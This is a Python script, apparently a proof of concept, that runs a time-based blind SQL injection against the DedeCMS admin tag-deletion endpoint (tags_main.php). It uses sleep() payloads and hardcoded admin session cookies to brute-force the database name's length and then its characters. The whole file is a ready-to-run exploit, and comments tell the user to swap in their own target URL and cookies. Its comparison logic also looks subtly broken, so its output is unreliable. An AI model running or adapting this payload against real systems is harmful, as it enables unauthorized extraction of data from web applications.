import requests
import time

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
database = ''
length=0
for l in range(1,20):
    Url = 'http://localhost:8086/admin/tags_main.php?action=delete&ids=if(length(database())>{0},666,sleep(3))'
    #replace with your url, here keep the '666' in payload if(length(database())>{0},666,sleep(3)) in order not to delete the tags
    UrlFormat = Url.format(l)
    start_time0 = time.time()
    cookies = {
		"dede_csrf_token": "89fbfaabddf9fbc14a2fc148606818ff",
		"dede_csrf_token__ckMd5": "0fe49927c42c854a",
		"DedeLoginTime": "1695266280",
		"DedeLoginTime__ckMd5": "29e695100a28380a",
		"DedeStUUID": "7bf8a37cf0ee8",
		"DedeStUUID__ckMd5": "da06278b80034043",
		"DedeUserID": "1",
		"DedeUserID__ckMd5": "b55b6fbf67e0257e",
		"ENV_GOBACK_URL": "/admin/content_list.php",
		"PHPSESSID": "3r1etgf62m34mf1kqqt8r3pfi6",
	}#replace with your cookies here

    requests.get(UrlFormat,headers=headers,cookies=cookies)
    print(time.time()-start_time0)
    if  time.time() - start_time0 > 2:
            print('database length is ' + str(l))
            length=l;
            break
    else:
        pass
for i in range(1,length+1):
    for char in chars:
        charAscii = ord(char)
        url = 'http://localhost:8086/admin/tags_main.php?action=delete&ids=if(ascii(substr(database(),{0},1))>{1},666,sleep(3))'
        # replace with your url, here keep the '666' in payload if(length(database())>{0},666,sleep(3)) in order not to delete the tags
        urlformat = url.format(i,charAscii)
        start_time = time.time()
        cookies = {
            "dede_csrf_token": "89fbfaabddf9fbc14a2fc148606818ff",
		    "dede_csrf_token__ckMd5": "0fe49927c42c854a",
		    "DedeLoginTime": "1695266280",
		    "DedeLoginTime__ckMd5": "29e695100a28380a",
		    "DedeStUUID": "7bf8a37cf0ee8",
		    "DedeStUUID__ckMd5": "da06278b80034043",
		    "DedeUserID": "1",
		    "DedeUserID__ckMd5": "b55b6fbf67e0257e",
		    "ENV_GOBACK_URL": "/admin/content_list.php",
		    "PHPSESSID": "3r1etgf62m34mf1kqqt8r3pfi6",

        }#replace with your cookies here
        requests.get(urlformat,headers=headers,cookies=cookies)
        if  time.time() - start_time > 2:
            database+=char
            print('database: ',database)
            break
        else:
            pass
print('database is ' + database)
